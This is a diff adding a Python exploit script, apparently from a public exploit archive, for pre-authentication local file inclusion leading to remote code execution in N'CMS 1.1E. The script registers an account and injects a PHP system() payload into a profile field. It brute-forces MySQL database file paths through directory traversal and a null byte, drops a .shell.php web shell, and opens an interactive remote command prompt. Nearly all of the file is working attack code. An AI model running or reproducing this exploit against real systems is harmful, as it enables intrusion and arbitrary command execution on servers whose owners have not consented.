@@ -1,0 +1,243 @@
+#!/usr/bin/python
+# ~INFORMATION
+# Exploit Title:	N`CMS 1.1E Pre-Auth Local File Inclusion Remote Code Exploit
+# Date: 		11/3/2011
+# Software link:	http://bit.ly/eJAyw5
+# Tested on:		Linux bt
+# Version:		1.1E
+# PHP.ini Settings:	gpc_magic_quotes = Off
+
+# Note: The web application was lucky to not be exploited by session 
+# injection with a malicious username example <?php system($_GET[cmd]); 
+# as htmlentities() encoded the bracket :-)
+
+# ~VULNERABLE CODE
+'''
+<?php
+if( isset( $_GET['page'] ) )
+{
+	if( file_exists( 'page/'.$_GET['page'].'.php' ) )
+	{
+		include( 'page/'.$_GET['page'].'.php' );
+	}
+	else
+	{
+		include( 'page/404.php' );
+	}
+}
+else
+{
+	include( 'page/home.php' );
+}
+?>
+'''
+import random,time,sys,urllib,urllib2,re,httplib,socket,base64,os,getpass
+from optparse import OptionParser
+from urlparse import urlparse,urljoin
+from urllib import urlopen
+from cookielib import CookieJar
+
+__CONTACT__ ="TecR0c(tecr0c@tecninja.net)"
+__DATE__ ="11.3.2011"
+
+usage = 'Example : %s http://localhost/ncms/ -c user:pass -w databases.txt -p 127.0.0.1:8080' % __file__
+parser = OptionParser(usage=usage)
+parser.add_option("-p","--proxy", type="string",action="store", dest="proxy",
+        help="HTTP Proxy <server>:<port>")
+parser.add_option("-w","--wordlist", type="string",action="store", dest="wordlist",
+        help="file to use to bruteforce database")
+parser.add_option("-c","--credentials", type="string",action="store", dest="credentials",default="hacker:ph33r",
+        help="credentials for login, "
+	"or [default: %default]")
+
+(options, args) = parser.parse_args()
+
+if options.proxy:
+	print '[+] Using Proxy'+options.proxy
+
+# User Agents
+agents = ["Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
+        "Internet Explorer 7 (Windows Vista); Mozilla/4.0 ",
+        "Google Chrome 0.2.149.29 (Windows XP)",
+        "Opera 9.25 (Windows Vista)",
+        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
+        "Opera/8.00 (Windows NT 5.1; U; en)"]
+agent = random.choice(agents)
+
+traversal = './../../../../../../../..'
+
+def banner():
+    if os.name == "posix":
+        os.system("clear")
+    else:
+        os.system("cls")
+    header = '''
+|----------------------------------------|
+|Exploit: N'CMS LFI RCE
+|Author: %s
+|Date: %s
+|----------------------------------------|\n
+'''%(__CONTACT__,__DATE__)
+    for i in header:
+        print "\b%s"%i,
+        sys.stdout.flush()
+        time.sleep(0.005)
+
+def proxyCheck():
+        if options.proxy:
+                try:
+                        h2 = httplib.HTTPConnection(options.proxy)
+                        h2.connect()
+                        print "[+] Using Proxy Server:",options.proxy
+                except(socket.timeout):
+                        print "[-] Proxy Timed Out\n"
+                        pass
+                        sys.exit(1)
+                except(NameError):
+                        print "[-] Proxy Not Given\n"
+                        pass
+                        sys.exit(1)
+                except:
+                        print "[-] Proxy Failed\n"
+                        pass
+                        sys.exit(1)
+
+def getProxy():
+        try:
+                proxy_handler = urllib2.ProxyHandler({'http': options.proxy})
+        except(socket.timeout):
+                print "\n[-] Proxy Timed Out"
+                sys.exit(1)
+        return proxy_handler
+
+cj = CookieJar()
+if options.proxy:
+	opener = urllib2.build_opener(getProxy(), urllib2.HTTPCookieProcessor(cj))
+else:
+	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+opener.addheaders = [('User-agent', agent)]
+
+def registerUser():
+        webSiteUrl = url.geturl()+"?page=register"
+	parameters = {'login' : username,'password': password,'password2' : password,'email' : 'test@test.com',
+	'register' : '+Enregistrer+'}
+	encodedParameters = urllib.urlencode(parameters)
+	try:
+		opener.open(webSiteUrl, encodedParameters).read()
+	except:
+		print '[-] Failed'
+		sys.exit()
+	print '[+] Created User, '+username	
+
+def edit_profile():
+        webSiteUrl = url.geturl()+"?page=edit_profil"
+	parameters = { 'User-Agent' : agent,
+	'profil' : '<?php system(base64_decode($_REQUEST["cmd"]));?>','edit_profil' : '+Enregistrer+'}
+	encodedParameters = urllib.urlencode(parameters)
+	try:
+		response = opener.open(webSiteUrl, encodedParameters).read()
+	except:
+		print '[-] Failed'
+		sys.exit()
+	print '[+] Added Payload To Page'
+
+def login():
+        """ Add php payload to database """
+        webSiteUrl = url.geturl()+"?page=register"
+	parameters = {'login' : username,'password' : password,'actplayer' : 'login'}
+	encodedParameters = urllib.urlencode(parameters)
+	try:
+		opener.open(webSiteUrl, encodedParameters).read()
+	except:	
+		print '[-] Failed'
+		sys.exit()
+	print '[+] Authenticated To Website'
+
+def traversalCmd(encodedCommand,database):
+	webSiteUrl = url.geturl()+"?page="+traversal+"/var/lib/mysql/"+database+"/accounts.MYD%00"
+	parameters = {'cmd' : encodedCommand}
+	encodedParameters = urllib.urlencode(parameters)
+	try:
+		opener.open(webSiteUrl, encodedParameters).read()
+	except:
+		print '[-] Failed'
+		sys.exit()
+
+def postRequestWebShell(encodedCommand):
+        webSiteUrl = url.geturl()+'.shell.php'
+	commandToExecute = [
+	('cmd',encodedCommand)]
+	cmdData = urllib.urlencode(commandToExecute)
+	try:
+		response = opener.open(webSiteUrl, cmdData).read()
+	except:
+		print '[-] Failed'
+		sys.exit()
+	return response
+
+def fileCheck():
+        webSiteUrl = url.geturl()+"?page="+traversal+"/var/lib/mysql/mysql_upgrade_info%00"
+	try:
+		response = opener.open(webSiteUrl).read()
+	except:
+		print '[-] Failed'
+		sys.exit()
+	doesntExist = re.compile(r"Erreur 404")
+	findAnswer = doesntExist.search(response)
+	if findAnswer:
+		"[-] Can Not Use This Techinque"
+		sys.exit()
+
+def bruteForceDatabase():
+	try:
+        	databases = open(options.wordlist, "r").readlines()
+        	print "[+] Length Of Wordlist: "+str(len(databases))
+	except(IOError):
+        	print "[-] Error: Check Your Wordlist Path\n"
+        	sys.exit(1)
+	for database in databases:
+        	database = database.replace("\r","").replace("\n","")
+        	webSiteUrl = url.geturl()+"?page="+traversal+"/var/lib/mysql/"+database+"/accounts.MYD%00"
+		print '[X] Testing Database Name: '+database
+		try:
+			response = opener.open(webSiteUrl).read()
+		except urllib2.HTTPError, error:
+                        	print '[-] Failed'
+		payload = re.compile(r"Erreur 404")
+		findPayload = payload.search(response)
+		if not findPayload:
+			print '[+] Found Database: '+database+'\n'
+			commandLine(database)
+
+def commandLine(database):
+	encodedCommand = "echo '<?php system(base64_decode($_REQUEST[cmd]));?>' > .shell.php"
+	encodedCommand = base64.b64encode(encodedCommand)
+	traversalCmd(encodedCommand,database)
+	commandLine = ('[RSHELL] %s@%s# ') % (getpass.getuser(),url.netloc)
+	while True:
+		try:
+			command = raw_input(commandLine)
+			encodedCommand = base64.b64encode(command)
+			response = postRequestWebShell(encodedCommand)
+			print response
+		except KeyboardInterrupt:
+			encodedCommand = base64.b64encode('rm .shell.php')
+			postRequestWebShell(encodedCommand)
+			print "\n[!] Removed .shell.php\n"
+			sys.exit()
+
+if "__main__" == __name__:
+        banner()
+	try:
+	        url=urlparse(args[0])
+	except:
+        	parser.print_help()
+        	sys.exit()
+	getProxy()
+	username, password = options.credentials.split(':')
+	proxyCheck()
+	registerUser()
+	login()
+	edit_profile()
+	fileCheck()
+	bruteForceDatabase()
